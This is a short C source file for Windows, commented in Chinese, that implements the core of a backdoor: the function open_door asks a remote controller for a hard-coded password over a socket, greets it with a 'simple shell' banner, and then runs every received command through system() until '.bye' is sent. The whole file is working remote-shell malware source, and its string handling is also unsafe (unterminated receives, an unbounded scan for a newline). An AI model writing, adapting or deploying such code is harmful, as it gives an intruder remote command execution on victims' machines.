#include <stdio.h>
#include <winsock.h>
#include <windows.h>
#include "door.h"

int work = 1;
/*  open_door: 打开控制者和被控端的大门.
 *  @target: 传入一个socket, 为控制者的socket句柄
 *  return: 0
 * */
int open_door(SOCKET target) {
    char buf[128] = {0};
    //密码验证下...
	while (1){
        //发送密码提示符
		send(target, "password:", 10, 0);	
        //接受密码
		recv(target, buf, 64, 0);
        //调整下接受到的字符串
		adjust_cmd(buf);
        //如果密码正确就放行
		if (0 == strcmp(buf, G_PASSWORD))
			break;
	}
    //发送个欢迎信息
    send(target, "--==[ welcome to my simple shell ]==--\n", 40, 0);
    //进入工作循环, work变量的状态控制工作状态
    while (work){
        //发送个命令提示符
        send(target, ">>", 2, 0);
        //接受控制端的命令,放到buf中
        recv(target, buf, 128, 0);
        adjust_cmd(buf);
        //如果是退出指令就退出程序,这里是".bye"
        if ( 0 == strcmp(buf, ".bye"))
            work = 0;
        //否则就使用system函数执行控制端发送的命令
        system(buf);
    }
    return 0;
}

/*  adjust_cmd: 调整字符串的末尾字符, 使之方便操作
 *  @in: 传入的指定被调整的字符串指针
 *  return: 该字符串指针
 * */
char *adjust_cmd(char *in) {
	int i=0;
    //将索引移动到末尾, 如果发现有回车或者换行
	while (in[i] != '\r' && in[i] != '\n' )
		i++;
    //就替换成\0
	in[i]='\0';
	return in;
}
